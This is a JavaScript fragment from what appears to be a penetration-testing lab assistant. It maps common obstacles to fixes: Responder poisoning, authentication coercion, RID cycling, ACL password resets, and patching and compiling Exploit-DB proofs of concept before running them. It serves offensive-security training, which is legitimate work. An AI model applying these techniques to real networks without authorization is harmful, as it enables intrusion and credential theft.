    'blocker.password_restriction': { title: 'Password Policy Restriction', why: 'NT_STATUS_PASSWORD_RESTRICTION (0xc000006c): the domain rejected the new password due to minimum length, complexity, password history, or minimum password age.', body: 'Pick a longer complex password (12+ characters with uppercase, lowercase, digits, and a symbol, e.g. ObolP@ssw0rd2026!). If it still fails, Minimum Password Age (> 0 days) is blocking user-level self-resets (setuserinfo2 / smbpasswd): use a GenericAll / ForceChangePassword ACL reset (bloodyAD set password) from a controlling principal instead.', code: "rpcclient -U '<domain>/<user>%<pass>' <target> -c 'getdompwinfo'" },
    'blocker.host_down': { title: 'Host Seems Down (ICMP Blocked)', why: 'Nmap reported the host as down because Windows Firewall or a router dropped the ICMP ping probe.', body: 'Re-run Nmap with -Pn to skip host discovery and scan TCP ports directly.', code: 'nmap -Pn -p- --min-rate 5000 --open <target>' },
    'blocker.responder_quiet': { title: 'Responder Is Quiet (No Broadcast Traffic)', why: 'Responder is listening in analyse or poison mode, but no LLMNR/NBT-NS/mDNS broadcast queries have arrived.', body: 'Confirm you passed the VPN/lab interface (-I tun0), or actively coerce authentication from a target (PetitPotam / PrinterBug / MSSQL xp_dirtree) instead of waiting passively.', code: 'sudo responder -I tun0 -wv' },
    'blocker.tls_scheme': { title: 'TLS / HTTPS Scheme Mismatch or Self-Signed Cert', why: 'You spoke plain HTTP to an HTTPS port (400 Bad Request: plain HTTP request was sent to HTTPS port) or TLS verification rejected a self-signed certificate.', body: 'Switch the URL scheme to https:// and pass -k (curl) or -mc all to ignore self-signed certificate errors, and add the certificate CN/SAN to /etc/hosts.', code: 'curl -skI https://<target>/' },
    'blocker.access_denied': { title: 'Access Denied (Insufficient Privileges)', why: 'The operation was refused with Access is denied / Permission denied / EACCES.', body: 'Your current account or integrity level lacks the required ACL or privilege. On Windows, check if you are a filtered local admin needing UAC bypass (whoami /groups) or missing a token privilege (whoami /priv); on Linux, check sudo -l, group memberships (id), and file ownership.', code: 'whoami /groups & whoami /priv' },
    'blocker.samr_null_denied': { title: 'SAMR Null Session Denied (RestrictAnonymousSAM)', why: 'Anonymous SMB connected, but SAMR user enumeration (enumdomusers / --users) returned NT_STATUS_ACCESS_DENIED.', body: 'Modern Windows hosts block anonymous SAMR queries by default. Pivot to Guest RID cycling (--rid-brute), LSARPC SID lookups (lsaenumsid / lookupsid), or authenticate with a discovered credential.', code: "nxc smb <target> -u 'guest' -p '' --rid-brute" },
    'exploit.hazard_py2': { title: 'Pre-Flight Hazard: Legacy Python 2 Exploit Syntax Detected', why: 'Static inspection spotted Python 2 print statements, raw_input(), or removed stdlib modules (urllib2, cookielib, urlparse, httplib) that will crash under Python 3.', body: 'Normalize CRLF line endings, insert a UTF-8 coding header for non-ASCII author comments, and convert the script in place with 2to3 -w before executing it.', code: "dos2unix {{edb_file|exploit.py}} 2>/dev/null; sed -i '1i # -*- coding: utf-8 -*-' {{edb_file|exploit.py}} && 2to3 -w {{edb_file|exploit.py}}" },
    'exploit.hazard_py3_syntax': { title: 'Pre-Flight Hazard: Unterminated Multi-Line String Literal in Python PoC', why: 'Static inspection spotted an unterminated single- or double-quoted string literal split across a raw newline, which raises SyntaxError before the PoC can execute.', body: 'Wrap multi-line HTTP/payload blocks in triple quotes ("""...""") or join split lines with explicit \\r\\n escapes in your local copy, then verify syntax with py_compile before firing.', code: 'python3 -m py_compile {{edb_file|exploit.py}}' },
    'exploit.hazard_version_gate': { title: 'Pre-Flight Hazard: Strict Banner / Version Gate in Exploit', why: 'The PoC checks a hardcoded version banner or regex before sending its payload and exits early if the target hides or customizes its version string.', body: 'Compare the script version check against the actual service banner; pass --force if supported, or comment out the brittle pre-check in your local copy when the underlying endpoint is still unpatched.', code: "grep -nE 'version|not vulnerable|sys\\.exit|exit\\(' <exploit.py>" },
    'exploit.hazard_java_target': { title: 'Pre-Flight Hazard: Java Bytecode Target or Retired -source/-target Flag', why: 'Modern JDKs (Java 17/21) reject retired javac -source/-target 1.5/1.6/1.7 flags and emit class version 61/65 bytecode that fails on older Java 8/11 targets with UnsupportedClassVersionError.', body: 'Compile Java payloads with --release 8 (or update hardcoded -source/-target 1.5/1.6/1.7 flags in wrapper scripts to -source 8 -target 8) so compilation succeeds and runs on Java 8+ runtimes.', code: 'javac --release 8 <exploit.java>' },
    'exploit.hazard_burp_proxy': { title: 'Pre-Flight Hazard: Hardcoded Localhost Burp Proxy (127.0.0.1:8080)', why: 'The mirrored PoC contains an active proxies = {... 127.0.0.1:8080 ...} setting left behind by the exploit author, which will fail with ProxyError if Burp Suite is closed.', body: 'Clear the hardcoded proxy dictionary in your local PoC copy (or start Burp on 127.0.0.1:8080 to intercept the exploit traffic) before firing.', code: "sed -i -E \"s/proxies\\s*=\\s*\\{[^}]*127\\.0\\.0\\.1:(8080|8081|8000|8888)[^}]*\\}/proxies = {}/g\" {{edb_file|exploit.py}}" },
    'exploit.hazard_c_compile': { title: 'Pre-Flight Hazard: C / C++ Exploit Requires Matched Compilation', why: 'This Exploit-DB entry is raw C/C++ source code that must be compiled for the target OS, architecture, and libc version before running.', body: 'Compile on the target when gcc is present, or link statically (-static) on Kali so host GLIBC version skew does not break execution on older targets.', code: 'gcc {{edb_file|exploit.c}} -o exploit_bin -static -pthread || gcc -m32 {{edb_file|exploit.c}} -o exploit32 -static' },
    'blocker.py2_syntax_or_module': { title: 'Python 2 Exploit Syntax or Module Under Python 3', why: 'The PoC crashed with Missing parentheses in call to print, No module named urllib2/urlparse/httplib/cookielib, or a Python 3 str/bytes TypeError.', body: 'Convert the legacy Python 2 Exploit-DB script in place with dos2unix + 2to3 -w (and prepend a UTF-8 coding header), or invoke it with python2 if installed. Check socket.send() and base64 calls for bytes (.encode()).', code: "dos2unix {{edb_file|exploit.py}}; sed -i '1i # -*- coding: utf-8 -*-' {{edb_file|exploit.py}} && 2to3 -w {{edb_file|exploit.py}}" },
    'blocker.python_dep_or_pep668': { title: 'Missing Python Dependency or PEP 668 pip Block', why: 'The PoC raised ModuleNotFoundError (e.g. Crypto, requests_toolbelt, bs4, pwn) or pip failed with externally-managed-environment (PEP 668).', body: 'Create an isolated virtual environment in /tmp/edb-venv and install the missing package there (use pycryptodome whenever a script imports Crypto), then run the exploit with /tmp/edb-venv/bin/python3.', code: 'python3 -m venv /tmp/edb-venv && /tmp/edb-venv/bin/pip install pycryptodome requests beautifulsoup4 requests-toolbelt && /tmp/edb-venv/bin/python3 {{edb_file|exploit.py}}' },
    'blocker.hardcoded_proxy': { title: 'Hardcoded Localhost Debug Proxy (127.0.0.1:8080)', why: 'ProxyError / Connection refused to 127.0.0.1:8080: the exploit author left a local Burp Suite proxy hardcoded in the script.', body: 'Strip or empty the proxies = {...} dictionary in the PoC (or start Burp on 127.0.0.1:8080 if you want to inspect the traffic) and re-run.', code: "sed -i -E \"s/proxies\\s*=\\s*\\{[^}]*127\\.0\\.0\\.1:(8080|8000|8888)[^}]*\\}/proxies = {}/g\" {{edb_file|exploit.py}}" },
    'blocker.tls_cert_verify': { title: 'Self-Signed TLS Certificate Verification Failed', why: 'SSLCertVerificationError / CERTIFICATE_VERIFY_FAILED: the PoC rejected the target self-signed lab HTTPS certificate.', body: 'Run with PYTHONHTTPSVERIFY=0 CURL_CA_BUNDLE=\"\", or add verify=False to requests.get/post (or ssl._create_unverified_context() for urllib) in the local PoC copy.', code: 'PYTHONHTTPSVERIFY=0 CURL_CA_BUNDLE="" python3 -W ignore {{edb_file|exploit.py}}' },
    'blocker.glibc_or_arch_mismatch': { title: 'Compiled Binary GLIBC, Architecture, or Header Mismatch', why: 'The compiled C exploit failed with version GLIBC_2.3x not found, Exec format error, cannot open shared object file, or fatal error: gnu/stubs-32.h.', body: 'Compile directly on the target if gcc is available; otherwise link statically (-static), pass -m32 (with gcc-multilib installed) for 32-bit targets, or cross-compile Windows .c exploits with x86_64-w64-mingw32-gcc.', code: 'gcc {{edb_file|exploit.c}} -o exploit -static -pthread || gcc -m32 {{edb_file|exploit.c}} -o exploit32 -static' },
  };

  // Resolve a (move, command index) to a canvas note, with a graceful fallback to the pack's own command
  // note + move hypothesis so an un-authored command is never empty.
  OBOL.fieldNote = function (move, idx) {
    if (!move) return null;
    var isAuthored = !!(OBOL.FIELD_NOTES[move.id] || [])[idx];
    var authored = (OBOL.FIELD_NOTES[move.id] || [])[idx] || {};
    var cmd = (move.commands || [])[idx] || {};
    var firstSentence = function (s) { s = String(s || '').trim(); var m = s.match(/^.*?[.!?](\s|$)/); return m ? m[0].trim() : s; };
    // An authored note OWNS its sections: it must not inherit the pack command note as "How To Land It",
    // or an enumeration note that deliberately leads on "what to look for" would still restate its command.
    // Only an UN-authored command falls back to the pack note / hypothesis so its cell is never empty.
    var land = isAuthored ? (authored.land || [])
      : (cmd.note ? [String(cmd.note)] : (move.hypothesis ? [firstSentence(move.hypothesis)] : []));
    var locus = (OBOL.pack && OBOL.pack.commandLocus) ? OBOL.pack.commandLocus(cmd) : 'remote';
    // "What" is move-level (the goal is the same for every command of a move), authored once in
    // OBOL.FIELD_MOVE; a per-command entry may still override it. It answers, in plain language with no
    // assumed knowledge, what this move is trying to achieve and how it moves the learner toward the flag.
    var moveMeta = (OBOL.FIELD_MOVE || {})[move.id] || {};
    return {
      when: authored.when || '',
      what: authored.what || moveMeta.what || '',
      setup: (authored.setup && authored.setup.length) ? authored.setup : null,
      // `use` references OTHER moves by id (e.g. 'shell-listener') whose commands the canvas surfaces as
      // prerequisite "Set Up First" steps, pulled live from the packs. Reuse, not re-authoring: the Shells
      // lane stays the single source of truth for the catcher / reverse-shell / transfer one-liners.
      use: (authored.use && authored.use.length) ? authored.use : null,
      land: land,
      look: authored.look || [],
      win: authored.win || '',
      mistakes: authored.mistakes || [],
      doctor: authored.doctor || null,
      locus: locus,
      authored: isAuthored,
    };
  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
